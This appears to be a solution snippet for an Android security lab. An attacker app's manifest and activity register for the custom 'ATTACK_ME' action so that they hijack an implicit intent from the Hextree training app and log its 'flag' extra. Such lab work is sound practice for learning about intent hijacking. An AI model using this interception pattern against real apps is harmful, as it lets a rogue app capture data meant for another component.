// in androidmanifest.xml
        <activity
            android:name=".Hijack"
            android:exported="true">
            <intent-filter>
                <action android:name="io.hextree.attacksurface.ATTACK_ME" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>



    // in Hijack class 
    public class Hijack extends AppCompatActivity {

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            EdgeToEdge.enable(this);
            setContentView(R.layout.activity_hijack);
            ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
                Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
                v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
                return insets;
            });

            Intent intent = getIntent();
            Log.d("Flag10", intent.getStringExtra("flag"));
        }
    }